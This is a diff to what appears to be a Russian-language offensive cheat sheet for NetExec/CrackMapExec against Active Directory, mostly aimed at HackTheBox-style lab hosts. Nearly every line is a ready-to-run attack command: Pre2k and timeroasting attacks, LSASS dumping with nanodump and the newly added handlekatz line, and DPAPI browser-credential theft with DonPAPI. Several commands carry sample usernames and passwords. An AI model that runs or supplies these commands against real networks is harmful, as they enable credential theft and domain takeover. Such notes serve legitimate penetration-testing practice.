@@ -111,7 +111,7 @@
 
 		(атака Pre2k)	nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k		
 
-		(посмотреть все компы в сети) nxc smb <dc> -u '' -p '' --conpeters
+		(посмотреть все компы в сети) nxc smb <dc> -u '' -p '' --computers
 
 		(атака timeroasting)	nxc smb rustykey.htb -M timeroast
 
@@ -129,6 +129,8 @@
 
 		(тоже но скрытнное)	nxc smb 10.10.11.76 -u user -p pass -M nanodump		
 
+		(тоже еще и обфусцированое) crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M handlekatz
+		
 		((получение кредов из браузеров))	mxc smb ss.banki.htb -u boss -p "password" -d banki.htb --dpapi			
   					pipx install git+https://github.com/login-securite/DonPAPI.git
 					donpapi collect -u admin -p 'Password123!' -d domain.local -t ALL {target_lists} (--fetch-pvk)
